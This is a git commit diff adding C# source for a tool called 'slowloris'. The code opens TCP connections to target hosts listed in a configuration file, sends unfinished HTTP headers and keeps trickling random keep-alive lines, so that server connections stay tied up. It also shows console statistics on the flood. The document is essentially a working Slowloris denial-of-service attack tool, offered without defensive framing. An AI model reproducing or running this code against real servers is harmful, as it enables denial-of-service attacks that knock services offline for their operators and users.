69458601e470e89af3182794c0b18d06e93bb2b6
MATEUSZ ROGALSKI <mateusz@mrogal.ski>
2022-03-02 13:02:08 +0100

    caught exception on smaller screens

---
+++ slowloris/LimitedHttpConnection.cs
@@ -0,0 +1,73 @@
+﻿using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+internal class LimitedHttpConnection
+{
+    private readonly TargetInfo _target;
+
+    private Socket? socket;
+    private ThrottledNetworkStream? stream;
+
+    private bool _isFlooding = true;
+
+    public LimitedHttpConnection(TargetInfo target)
+    {
+        _target = target;
+    }
+
+    private async Task WriteAsync(string format, params object[] args)
+    {
+        byte[] buffer = Encoding.UTF8.GetBytes(string.Format(format, args));
+        await stream!.WriteAsync(buffer);
+    }
+
+    private async Task ConnectAsync()
+    {
+        IPAddress[] addresses = Dns.GetHostAddresses(_target.host);
+        foreach (IPAddress addr in addresses)
+        {
+            socket = new (addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+            await socket.ConnectAsync(new IPEndPoint(addr, _target.port));
+        }
+        if (socket is not null && socket.Connected)
+        {
+            Statistics.RecordConnectionEstablished(_target.host);
+            stream = new(socket, _target);
+            await SendHeadersAsync();
+        }
+    }
+
+    private async Task SendHeadersAsync()
+    {
+        const string FORMAT = "GET / HTTP/1.1\r\nHost: {0}\r\nAccept: */*\r\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n";
+        await WriteAsync(FORMAT, _target.host);
+    }
+
+    private async Task KeepAliveAsync()
+    {
+        const string FORMAT = "KeepAlive: {0}\r\n";
+        await WriteAsync(FORMAT, new Random().Next(0, 1000));
+    }
+
+    public async Task FloodHost()
+    {
+        _isFlooding = true;
+        while (_isFlooding)
+        {
+            await ConnectAsync();
+            while (socket is not null && socket.Connected && _isFlooding)
+            {
+                await KeepAliveAsync();
+                await Task.Delay(new Random().Next(0, 500));
+            }
+        }
+        stream?.CloseAndDispose();
+        socket = null;
+    }
+
+    public void Stop()
+    {
+        _isFlooding = false;
+    }
+}
---
+++ slowloris/Program.cs
@@ -0,0 +1,102 @@
+﻿using Newtonsoft.Json;
+
+if (!File.Exists("configuration.json"))
+{
+    Console.WriteLine("Unable to find configuration file.");
+    return;
+}
+
+var configuration = JsonConvert.DeserializeObject<Configuration>(File.ReadAllText("configuration.json"));
+if (configuration != null && configuration.targets.Any())
+{
+    try
+    {
+        BuildScreen(configuration);
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine("Not enough screen space to display statistics.");
+    }
+
+    var flooder = new FlooderProcess(configuration);
+    Console.CancelKeyPress += (sender, e) =>
+    {
+        flooder.Stop();
+        Console.Clear();
+        e.Cancel = true;
+    };
+
+    flooder.BeginFlood();
+    while (flooder.IsFlooding)
+    {
+        try
+        {
+            UpdateScreen(configuration);
+        }
+        catch { }
+        Thread.Sleep(100);
+    }
+}
+
+void UpdateScreen(Configuration configuration)
+{
+    var connectedFontColor = ConsoleColor.Green;
+    var disconnectedFontColor = ConsoleColor.Red;
+    int i = 3;
+    var enumerator = configuration.targets.GetEnumerator();
+    while (enumerator.MoveNext())
+    {
+        var target = enumerator.Current;
+        HostStatistics stats = Statistics.Get(target.host);
+
+        Console.SetCursorPosition("##>> of ".Length, Math.Min(i++, Console.BufferHeight));
+        Console.ForegroundColor = stats.isConnected ? connectedFontColor : disconnectedFontColor;
+        Console.Write($"{target.host}:");
+        Console.ResetColor();
+
+        Console.SetCursorPosition("###>> Total bytes sent: ".Length, Math.Min(i++, Console.BufferHeight));
+        Console.Write(stats.bytesSent);
+
+        Console.SetCursorPosition("###>> Connected since: ".Length, Math.Min(i++, Console.BufferHeight));
+        Console.Write(stats.connectedEstablished);
+        i++;
+    }
+}
+
+void BuildScreen(Configuration configuration)
+{
+    var connectedFontColor = ConsoleColor.Green;
+    var disconnectedFontColor = ConsoleColor.Red;
+
+    Console.WriteLine(new string('#', Console.BufferWidth));
+    Console.WriteLine(new string('#', Console.BufferWidth));
+    Console.WriteLine("#>> Statistics:".PadRight(Console.BufferWidth - 1) + "#");
+    int i = 1;
+    var enumerator = configuration.targets.GetEnumerator();
+    while (enumerator.MoveNext())
+    {
+        var target = enumerator.Current;
+        HostStatistics stats = Statistics.Get(target.host);
+
+        Console.Write("##>> of ");
+        Console.ForegroundColor = stats.isConnected ? connectedFontColor : disconnectedFontColor;
+        Console.Write($"{target.host}:");
+        Console.ResetColor();
+        Console.SetCursorPosition(Console.BufferWidth - 1, Math.Min(2 + i++, Console.BufferHeight));
+        Console.WriteLine("#");
+
+        Console.Write($"###>> Total bytes sent: {stats.bytesSent}");
+        Console.SetCursorPosition(Console.BufferWidth - 1, Math.Min(2 + i++, Console.BufferHeight));
+        Console.WriteLine("#");
+
+        Console.Write($"###>> Connected since: {stats.connectedEstablished}");
+        Console.SetCursorPosition(Console.BufferWidth - 1, Math.Min(2 + i++, Console.BufferHeight));
+        Console.WriteLine("#");
+
+        Console.Write("##");
+        Console.SetCursorPosition(Console.BufferWidth - 1, Math.Min(2 + i++, Console.BufferHeight));
+        Console.WriteLine("#");
+    }
+    Console.WriteLine(new string('#', Console.BufferWidth));
+    Console.WriteLine(new string('#', Console.BufferWidth));
+}
